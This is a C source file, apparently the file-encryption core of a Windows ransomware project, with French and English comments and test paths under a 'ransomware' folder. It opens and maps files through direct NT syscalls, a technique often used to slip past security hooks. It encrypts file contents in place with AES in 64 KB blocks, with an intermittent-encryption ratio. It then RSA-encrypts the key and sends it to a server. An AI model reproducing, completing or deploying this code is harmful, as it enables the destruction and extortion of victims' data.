#include "core/encrypter.h"
#include "core/my_aes.h"
#include "utils/rng.h"
#include "core/rsa.h"
#include "core/api_client.h"
#include "core/aes_wrapper.h"
#include <stdint.h>
#include <stdio.h>

#define VIEW_SIZE (64 * 1024) // 64 KB
// #define SECTION_SIZE (0x100000) // 1MB

void DebugNtMapParams(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PULONG ViewSize,
    ULONG InheritDisposition,
    ULONG AllocationType,
    ULONG Protect)
{
    printf("\n--- [Debug NtMapViewOfSection Parameters] ---\n");
    printf("SectionHandle         : %p\n", SectionHandle);
    printf("ProcessHandle         : %p\n", ProcessHandle);
    printf("BaseAddress (in)      : %p\n", *BaseAddress);
    printf("ZeroBits              : 0x%lx\n", ZeroBits);
    printf("CommitSize            : %llu\n", (unsigned long long)CommitSize);
    if (SectionOffset)
        printf("SectionOffset         : %lld (0x%llx)\n", SectionOffset->QuadPart, SectionOffset->QuadPart);
    else
        printf("SectionOffset         : NULL\n");
    printf("ViewSize (in/out)     : %lu (0x%lx)\n", *ViewSize, *ViewSize);
    printf("InheritDisposition    : 0x%lx\n", InheritDisposition);
    printf("AllocationType        : 0x%lx\n", AllocationType);
    printf("Protect               : 0x%lx\n", Protect);
    printf("--------------------------------------------\n");
}

int MapViewOfSection_my(
    HANDLE sectionHandle,       // Handle to the section object
    HANDLE fileHandle,          // Handle to the file
    PLARGE_INTEGER sectionOffset, // Offset within the section to map from
    uint64_t *sizeOfMappedView,   // Pointer to receive the size of the mapped view
    PVOID *baseAddress_p         // Pointer to receive the base address of the mapped view
)
{
    // Validate input parameters
    if (!baseAddress_p || !sizeOfMappedView) {
        printf("Error: Invalid NULL pointers passed to MapViewOfSection_my()\n");
        return STATUS_INVALID_PARAMETER;
    }

    // Get the file size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        DWORD error = GetLastError();
        printf("Error getting file size: %lu\n", error);
        return STATUS_INVALID_PARAMETER;
    }
    
    // Set up mapping parameters
    ULONG zeroBits = 0; // Force system to map view in low memory address space
    PVOID baseAddress = NULL; // Use the provided address (can be NULL)
    ULONG viewSize = fileSize.QuadPart; // Will be updated by the system
    SIZE_T commitSize = (SIZE_T)fileSize.QuadPart;
    
    // Update the output size parameter
    *sizeOfMappedView = (uint64_t)fileSize.QuadPart;
    
    // For large files, limit the view size
    if (fileSize.QuadPart > VIEW_SIZE) {
        commitSize = 0;
        viewSize = VIEW_SIZE;
        *sizeOfMappedView = VIEW_SIZE;
    }
    
    // Handle section offset
    LARGE_INTEGER liOffset;
    if (sectionOffset != NULL) {
        liOffset.QuadPart = sectionOffset->QuadPart;
        // Check if the offset is within the file size
        if (liOffset.QuadPart + viewSize > fileSize.QuadPart) {
            printf("Error: Section offset exceeds file size\n");
            return 2;
        }

        // Check if the offset is aligned to page boundary (4KB)
        if (liOffset.QuadPart % 4096 != 0) {
            printf("Error: Section offset must be a multiple of page size (4096 bytes)\n");
            return STATUS_INVALID_PARAMETER;
        }
    } else {
        // If no offset provided, start from the beginning
        liOffset.QuadPart = 0;
    }

    // Debug the parameters before calling the API
    DebugNtMapParams(
        sectionHandle,
        GetCurrentProcess(),
        &baseAddress,
        zeroBits,
        commitSize,
        &liOffset,
        &viewSize,
        ViewShare,
        0,
        PAGE_READWRITE);

    // Call the syscall to map the view
    NTSTATUS status = SysNtMapViewOfSection(
        sectionHandle,
        GetCurrentProcess(),
        &baseAddress,
        zeroBits,
        commitSize,
        &liOffset,
        &viewSize,
        ViewShare,
        0,
        PAGE_READWRITE);
        
    if (NT_SUCCESS(status)) {
        *baseAddress_p = baseAddress;  // Update the caller's pointer with the mapped address
        *sizeOfMappedView = viewSize;  // Update with actual mapped size
        printf("Section mapped successfully at address: %p with viewSize: %lu\n", baseAddress, viewSize);
    } else {
        printf("Error mapping section: 0x%X\n", status);
        DWORD winErr = RtlNtStatusToDosError(status);
        printf("Windows Error: %lu\n", winErr);
    }
    
    return status;
}

int loadFileInMemory_test(HANDLE *fileHandle, HANDLE *sectionHandle, PVOID *localViewAdress, PCWSTR filePath, uint64_t *sizeOfMappedView)
{
    *fileHandle = NULL;
    *sectionHandle = NULL;
    *localViewAdress = NULL;

    OBJECT_ATTRIBUTES oa;
    NTSTATUS status = 0;
    UNICODE_STRING fileName;
    IO_STATUS_BLOCK osb;

    RtlInitUnicodeString(&fileName, filePath);
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    // TODO : Se renseigner sur le caching de la mémoire
    // Avec notamment ces flags qui peuvent éviter le cache FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
    status = SysNtCreateFile(
        fileHandle,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        &oa,
        &osb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (status != 0)
    {
        printf("Error opening file: 0x%X\n", status);
        return 1;
    }

    // Get the file size
    LARGE_INTEGER fileSize;
    GetFileSizeEx(*fileHandle, &fileSize);
    printf("File size: %lld bytes\n", fileSize.QuadPart);

    // Create a section for the file
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = fileSize.QuadPart;

    status = SysNtCreateSection(
        sectionHandle,
        SECTION_MAP_READ | SECTION_MAP_WRITE,
        NULL,
        (PLARGE_INTEGER)&sectionSize,
        PAGE_READWRITE,
        SEC_COMMIT,
        *fileHandle);

    if (NT_SUCCESS(status))
    {
        printf("Section created successfully\n");
    }
    else
    {
        printf("Error creating the section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }    
    
    PVOID baseAddress = NULL;
    LARGE_INTEGER sectionOffset;
    sectionOffset.QuadPart = 0; // Start mapping from the beginning of the file
    
    status = MapViewOfSection_my(
        *sectionHandle,          // Pass the handle, not the pointer to handle
        *fileHandle,             // Pass the handle, not the pointer to handle
        &sectionOffset,          // Pass the offset properly
        sizeOfMappedView,
        &baseAddress
    );

    if (!NT_SUCCESS(status))
    {
        printf("Error mapping section: 0x%X\n", status);
        printf("File handle: %p, Section handle: %p\n", *fileHandle, *sectionHandle);
        DWORD winErr = RtlNtStatusToDosError(status);
        printf("Windows Error: %lu\n", winErr);
        CloseHandle(*sectionHandle);
        CloseHandle(*fileHandle);
        return 1;
    }

    *localViewAdress = baseAddress;

    if (*localViewAdress == NULL)
    {
        printf("Error: Mapped address is NULL despite successful status: 0x%X\n", status);
        printf("File handle: %p, Section handle: %p\n", *fileHandle, *sectionHandle);
        CloseHandle(*sectionHandle);
        CloseHandle(*fileHandle);
        return 1;
    }

    return 0;
}


int key_handler(state_t key)
{

    // Send the key to the server
    char buff[257] = {'X'}; // 256 bytes + 1 for the null terminator

    uint8_t key_elongate[16] = {0}; // 16 bytes
    // Convert the key to a char array of size 16 bytes
    for (int i = 0; i < 16; i++)
    {
        // Convert to char
        key_elongate[i] = key[i / 4][i % 4];
    }

    // Encrypt the message using RSA
    rsa(key_elongate, buff);
    int i = 0;
    printf("Encrypted Key:\n'");
    while (buff[i] != 0)
    {
        printf("%c", buff[i]);
        i += 1;
    }
    printf("'\n");
    printf("Encrypted Key length: %d\n", i);

    // Send the key to the server (16 bytes)
    if (SendKey(buff) == 0)
    {
        return 0;
    }
    else
    {
        printf("Send failed\n");
        return 1;
    }
}

/**
 * @brief Chiffre un fichier en utilisant AES.
 *
 * Cette fonction prends un fichier et chiffre ce fichier par bloc de 64KB. Elle utilise AES
 * et sa densité dépend de encryptRatio qui est le nombre de blocs entre deux blocs chiffrés.
 * Le premier bloc chiffré est toujours le premier bloc de 64KB du fichier.
 * \n
 * Exemple : Si encryptRatio = 1, alors on chiffre tout le fichier. \n
 *           Si encryptRatio = 2, alors on chiffre un bloc sur deux. \n
 *           Si encryptRatio = 10, alors on chiffre un bloc sur dix. \n
 *
 * @warning Si le fichier est inférieur à 64KB, encryptRatio doit être égal à 0.
 *
 * @param filePath Le chemin du fichier à chiffrer.
 * @param encryptRatio Le ratio de chiffrement (nombre de blocs entre deux blocs chiffrés).
 * @return 0 si le chiffrement a réussi, 1 sinon (erreur print dans le stdout).
 */
int encrypter(PCWSTR filePath, int encryptionRatio)
{
    HANDLE fileHandle = NULL;
    HANDLE sectionHandle = NULL;
    PVOID localViewAdress = NULL;

    uint64_t sizeOfMappedView = 0; // size of the mapped view
    uint64_t offset = 0;           // offset for the next view

    // Check if file exists
    DWORD fileAttributes = GetFileAttributesW(filePath);
    if (fileAttributes == INVALID_FILE_ATTRIBUTES)
    {
        printf("File not found: %ls\n", filePath);
        return 1;
    }
    // Check if the file is a directory
    if (fileAttributes & FILE_ATTRIBUTE_DIRECTORY)
    {
        printf("The specified path is a directory: %ls\n", filePath);
        return 1;
    }
    // Check encryptRatio
    if (encryptionRatio < 1)
    {
        printf("Error: encryptRatio must be greater than or equal to 1\n");
        return 1;
    }

    generateRandomSeed(); // Initialize the random seed
    // Generate a random key of 128 bits (16 bytes)
    state_t key;
    generateRandomKey(key);
    state_t keys[10] = {{{0}}}; // Initialize all keys to zero (the base_key is added in the function)

    // Generate the keys (can't be more than 10 keys because of the Rcon table)
    GenerateTenKeys(key, keys);

    /*    do
       {
           // répéter à plusieurs endroits dans le fichier
           printf("size ofMappedView: %llu\n", sizeOfMappedView);
           DispatchEcryption(keys, vue, sizeOfMappedView);
           // increase the offset if needed
           // offset += sizeOfMappedView * encryptionRatio; // Increment the offset by the size of the view
           UnmapViewOfFile(localViewAdress);             // Unmap using the API (no need to call syscall directly)
           moveLocalViewAddress(&fileHandle, &sectionHandle, &localViewAdress, &sizeOfMappedView, &offset);
           break;
       } while (moveLocalViewAddress(&fileHandle, &sectionHandle, &localViewAdress, &sizeOfMappedView, &offset) == 0);
    */
    /*  state_t state = {
         {0x23, 0x45, 0x67, 0x89},
         {0xAB, 0xCD, 0xEF, 0x01},
         {0x09, 0x54, 0x67, 0x89},
         {0xCB, 0xA3, 0xEF, 0x10}};

     aes(keys, state);

     printf("encrypter side:  \n ");
     printState(state);
  */
    // Chiffrer plusieurs fichiers

    // Envoyer la clé
    if (loadFileInMemory_test(&fileHandle, &sectionHandle, &localViewAdress, filePath, &sizeOfMappedView) != 0)
    {
        printf("erreur dans loadFileInMemry \n");
        return 1;
    }

    PVOID baseAddress = localViewAdress;
    LARGE_INTEGER sectionOffset;
    sectionOffset.QuadPart = 0; // Start mapping from the beginning of the file
    do {
        DispatchEcryption(keys, (uint32_t *)baseAddress, sizeOfMappedView);
        // increase the offset if needed
        sectionOffset.QuadPart += sizeOfMappedView * encryptionRatio; // Increment the offset by the size of the view
        UnmapViewOfFile(baseAddress);             // Unmap using the API (no need to call syscall directly)
    } while (MapViewOfSection_my(sectionHandle, fileHandle, &sectionOffset, &sizeOfMappedView, &baseAddress) == 0);

    /* PVOID baseAddress = NULL;
    LARGE_INTEGER sectionOffset;
    sectionOffset.QuadPart = sizeOfMappedView; // Start mapping from the beginning of the file
    
    UnmapViewOfFile(localViewAdress); 
    MapViewOfSection_my(
            sectionHandle,
            fileHandle,
            &sectionOffset, // NULL for the offset (it should be a multiple of the page size : 4096 bytes)
            &sizeOfMappedView,
            &baseAddress); */
    

    // Free the section handle
    //  This will unmap the section from the process's address space
    //  and close the handle to the section object
    // syscall : NtUnmapViewOfSection(GetCurrentProcess(), localViewAdress);

    UnmapViewOfFile(localViewAdress); // Unmap using the API (no need to call syscall directly)
    CloseHandle(sectionHandle);
    // Close the file handle
    CloseHandle(fileHandle);
    return 0;
}
/* 
int main()
{
    // PCWSTR filePath = (PCWSTR)L"\\??\\C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test\\monfichier.txt";
    // PCWSTR filePath = (PCWSTR)L"\\??\\C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test\\rapport.pdf";
    PCWSTR filePath = (PCWSTR)L"\\??\\Z:\\ransomware\\test\\monfichier.txt";
    
    encrypter(filePath, 1);
    return 0;
} */